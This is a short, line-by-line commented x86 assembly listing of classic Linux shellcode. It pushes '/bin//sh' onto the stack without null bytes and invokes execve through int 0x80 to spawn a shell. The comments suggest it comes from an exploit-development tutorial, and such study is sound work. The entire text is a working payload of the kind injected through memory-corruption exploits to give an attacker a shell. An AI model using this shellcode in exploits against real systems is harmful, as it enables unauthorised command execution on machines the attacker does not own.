xor eax, eax      ; put 0 into eax
push eax          ; push 4 bytes of null from eax to the stack
push 0x68732f2f   ; push "//sh" to the stack
push 0x6e69622f   ; push "/bin" to the stack
mov ebx, esp      ; put the address of "/bin//sh" to ebx, via esp
push eax          ; push 4 bytes of null from eax to the stack
push ebx          ; push ebx to the stack
mov ecx, esp      ; put the address of ebx to ecx, via esp
mov al, 0xb       ; put 11 into eax, since execve() is syscall #11
int 0x80          ; call the kernel to make the syscall happen
